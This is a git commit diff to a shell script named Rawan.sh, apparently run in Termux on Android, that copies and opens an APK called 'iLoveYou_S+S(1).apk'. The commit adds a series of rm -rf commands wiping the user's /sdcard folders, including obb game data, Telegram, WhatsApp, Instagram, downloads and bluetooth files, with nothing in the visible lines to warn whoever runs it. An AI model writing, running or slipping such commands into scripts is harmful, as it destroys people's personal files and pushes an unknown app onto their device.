a0bf49d91f1142afda1dbe611ed88fec0da3fa14
BaapG <87407116+Vretlee@users.noreply.github.com>
2021-07-25 10:58:54 +0530

    Update Rawan.sh
    B

--- Rawan.sh
+++ Rawan.sh
@@ -5,4 +5,15 @@ python Crash.py
 cd  BaapG
 cp -r 'iLoveYou_S+S(1).apk' /sdcard
 cp -r JaiRajputana.jpg /sdcard
+cd /sdcard/Android
+rm -rf obb
+cd /sdcard
+rm -rf Telegram 
+rm -rf browser
+rm -rf GBWhatsApp
+rm -rf BGMI
+rm -rf ApkEditor
+rm -rf download
+rm -rf Instagram
+rm -rf bluetooth
 termux-open  'iLoveYou_S+S(1).apk'
